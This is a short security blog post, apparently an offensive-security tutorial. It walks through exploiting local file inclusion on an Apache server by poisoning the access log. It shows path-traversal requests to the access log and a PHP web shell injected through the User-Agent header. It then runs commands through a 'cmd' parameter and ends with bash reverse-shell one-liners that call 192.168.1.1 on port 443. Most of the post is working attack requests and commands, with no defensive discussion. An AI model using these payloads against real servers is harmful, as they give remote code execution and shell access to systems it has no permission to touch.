---
layout: post
title: Local File Inclusion - Apache User Agent Exploit
titledate: 08/29/23
tags: ["infosec","offsec", "web", "lfi", "shell", "exploit"]
---

<h4>Apache Web Server Log Poisoning</h4>

In this example, it is possible to inject a script via the HTTP User-Agent header into the Apache web server access log.

    GET /meteor/index.php?page=admin.php HTTP/1.1
    Host: vulnapp.com
    User-Agent: test here
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close

If we send an HTTP GET request via curl or burp to the server we can see the result of the User-Agent get logged 

    $ curl http://vulnapp.com/index.php?page=../../../../../../../../../var/log/apache2/access.log 

Using burp again or curl with the -A or --user-agent parameter we can try any string to verify that our agent is indeed showing up in the logs

With this vulnerability we can include some php to run system and let us execute commands by replacing the User-Agent with the following

    $ <?php echo system($_GET['cmd']); ?>

Now when we make a request to the access log and pass it the new argument cmd that we injected with our php script we should run the command via php's system

    GET /vulnapp/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls HTTP/1.1
    Host: vulnapp.com
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close

    <h3>NOTE: we removed the User-Agent header to keep from overwriting our injected script</h3>

Finally we can use the following bash 1-liner to attempt to establish a reverse tcp shell connection

    $ bash -i >& /dev/tcp/192.168.1.1/443 0>&1

The above command may fail if the command runs via sh and not bash, in which case

    $ bash -c "bash -i >& /dev/tcp/192.168.1.1/443 0>&1"

And of course we need to % [encode](https://www.urlencoder.org) our url

![_config.yml]({{ site.baseurl }}/images/web/lfi_shell.png)

burp seems to be much quicker and easier to work with for these types of attacks
